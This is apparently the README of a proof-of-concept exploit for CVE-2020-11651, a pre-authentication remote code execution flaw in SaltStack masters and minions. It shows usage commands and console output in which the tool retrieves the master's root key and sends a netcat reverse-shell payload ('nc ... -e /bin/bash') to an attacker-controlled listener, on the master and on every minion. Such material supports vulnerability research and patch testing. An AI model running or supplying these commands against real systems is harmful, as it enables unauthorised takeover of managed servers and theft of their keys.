# CVE-2020-11651

This is a POC for CVE-2020-11651, which obtains pre-auth RCE on a salt stack master, and/or all the associated minions. Some light details on the issue [are here](https://labs.f-secure.com/advisories/saltstack-authorization-bypass). POC for 2020-11652 not included. 

This obtains command execution on the master by creating a runner of salt.cmd with function cmd.exec_code. There's no interactivity implemented, youll need to catch a reverse shell. 

## Usage

Tested on Debian10 against a Debian10 instance. Needs ncat to receive and send a shell, and `pip3 install salt` library for transport.

```
user@debian10:~$ ./cve-2020-11651.py 192.168.200.135 master 'nc 192.168.200.137 4444 -e "/bin/bash"'
/usr/local/lib/python3.7/dist-packages/salt/ext/tornado/httputil.py:107: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working
  class HTTPHeaders(collections.MutableMapping):
Attempting to ping master at 192.168.200.135
Retrieved root key: ajazew2a7V7gaxT2e5Vyi1pALtWYLOCp3L+A3xYc1iilwZEPhbnERhhGvzrDh8NVa2x0xNvYIJE=
Got response for attempting master shell: {'tag': 'salt/run/20200504080050593352', 'jid': '20200504080050593352'}. Looks promising!

user@debian10:~$ ./cve-2020-11651.py 192.168.200.135 minions 'nc 192.168.200.137 4444 -e "/bin/bash"'
/usr/local/lib/python3.7/dist-packages/salt/ext/tornado/httputil.py:107: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working
  class HTTPHeaders(collections.MutableMapping):
Attempting to ping master at 192.168.200.135
Retrieved root key: ajazew2a7V7gaxT2e5Vyi1pALtWYLOCp3L+A3xYc1iilwZEPhbnERhhGvzrDh8NVa2x0xNvYIJE=
Sending command to all minions on master

user@debian10:~$ ./cve-2020-11651.py 192.168.200.135 fetchkeyonly
/usr/local/lib/python3.7/dist-packages/salt/ext/tornado/httputil.py:107: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working
  class HTTPHeaders(collections.MutableMapping):
Attempting to ping master at 192.168.200.135
Retrieved root key: ajazew2a7V7gaxT2e5Vyi1pALtWYLOCp3L+A3xYc1iilwZEPhbnERhhGvzrDh8NVa2x0xNvYIJE=
user@debian10:~$ 

```

![saltstack](https://raw.githubusercontent.com/dozernz/cve-2020-11651/master/saltstack.PNG)
